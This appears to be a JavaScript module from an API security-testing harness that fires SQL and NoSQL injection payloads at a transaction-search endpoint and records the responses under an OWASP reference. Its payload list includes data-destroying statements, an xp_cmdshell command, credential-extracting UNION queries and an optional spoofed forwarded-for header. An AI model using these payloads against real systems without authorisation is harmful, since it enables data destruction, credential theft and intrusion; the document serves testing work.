const { authedGet, sleep } = require('../lib/httpClient');


const PAYLOADS = [
  "' OR '1'='1",
  "' OR 1=1--",
  "admin' OR '1'='1'#",
  "1 UNION SELECT username, password FROM users",
  "' UNION SELECT NULL, NULL, NULL--",
  "x; DROP TABLE users--",
  "x; DELETE FROM accounts--",
  "'; INSERT INTO users VALUES (1,1)--",
  "1) OR (1=1",
  "'; EXEC xp_cmdshell('dir')--",
  '{"$where": "this.password.length > 0"}',
  '{"$ne": null}',
  '{"$gt": ""}',
  "Tesco'/*",
];

function buildPayloadList(count) {
  const list = [];
  for (let i = 0; i < count; i++) list.push(PAYLOADS[i % PAYLOADS.length]);
  return list;
}

async function runSqlInjection(baseUrl, token, { count = 20, requestsPerSecond = 5, forwardedFor } = {}) {
  const payloads = buildPayloadList(count);
  const intervalMs = 1000 / requestsPerSecond;
  const observations = [];

  for (const payload of payloads) {
    const url = `${baseUrl}/api/transactions/search?q=${encodeURIComponent(payload)}`;
    observations.push(await authedGet(url, token, forwardedFor));
    await sleep(intervalMs);
  }

  return { category: 'sql_nosql_injection', ruleRef: 'R1', owaspRef: 'API8:2023', observations };
}

module.exports = { runSqlInjection };
